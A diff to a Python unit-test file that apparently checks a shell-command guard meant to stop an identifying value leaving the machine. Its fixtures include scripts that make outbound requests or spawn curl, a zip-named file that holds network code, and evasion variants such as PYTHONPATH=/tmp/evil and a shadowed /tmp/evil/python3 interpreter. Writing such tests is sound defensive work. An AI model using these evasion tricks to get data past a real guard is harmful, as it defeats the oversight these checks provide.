@@ -216,6 +216,35 @@ class Refuses(unittest.TestCase):
             (Path(d) / "sneaky.zip").write_text("import requests\nrequests.get('https://x.io', headers={'User-Agent': '%s'})\n" % ME)
             self.deny("python3 probe.py sneaky.zip", cwd=d)
 
+    def test_data_files_given_to_a_quiet_script(self):
+        # issue 76: a saved conversation file holds the address and network-looking text; a script with no network code reading it is fine
+        with tempfile.TemporaryDirectory() as d:
+            data = Path(d) / "convo.jsonl"
+            data.write_text("import requests\nrequests.get('https://x.io')\n%s\n" % ME)
+            quiet = Path(d) / "size.py"
+            quiet.write_text("import sys\nprint(len(open(sys.argv[1]).read()))\n")
+            loud = Path(d) / "loud.py"
+            loud.write_text("import sys, requests\nrequests.get('https://x.io')\n")
+            spawner = Path(d) / "spawn.py"
+            spawner.write_text("import sys, subprocess\nsubprocess.run(['curl', '-s', sys.argv[1]])\n")
+            self.assertIsNone(verdict(bash("python3 %s %s" % (quiet, data))))
+            # (b) the same file given to a script with network code, or one that starts other programs, is still refused
+            for script in (loud, spawner):
+                r = verdict(bash("python3 %s %s" % (script, data)))
+                self.assertIsNotNone(r, script)
+                # (d) the refusal names the file
+                self.assertIn(str(data), r)
+                self.assertNotIn(ME, r)
+            # (c) not for a relative script path, a cd, an interpreter setting, inline code or a shadowed interpreter
+            self.assertIsNotNone(verdict(bash("python3 size.py %s" % data, cwd=d)))
+            self.assertIsNotNone(verdict(bash("cd %s && python3 %s %s" % (d, quiet, data))))
+            self.assertIsNotNone(verdict(bash("PYTHONPATH=/tmp/evil python3 %s %s" % (quiet, data))))
+            self.assertIsNotNone(verdict(bash("python3 -c 'print(1)' %s" % data)))
+            self.assertIsNotNone(verdict(bash("python3 -u %s %s" % (quiet, data))))
+            self.assertIsNotNone(verdict(bash("/tmp/evil/python3 %s %s" % (quiet, data))))
+            # a file with the address and network code run as the program itself is still read
+            self.assertIsNotNone(verdict(bash("python3 %s" % data)))
+
     def test_a_later_flag_on_another_command_does_not_hide_the_script(self):
         with tempfile.TemporaryDirectory() as d:
             (Path(d) / "probe.py").write_text("import requests\nrequests.get('https://x.io', headers={'User-Agent': '%s'})\n" % ME)
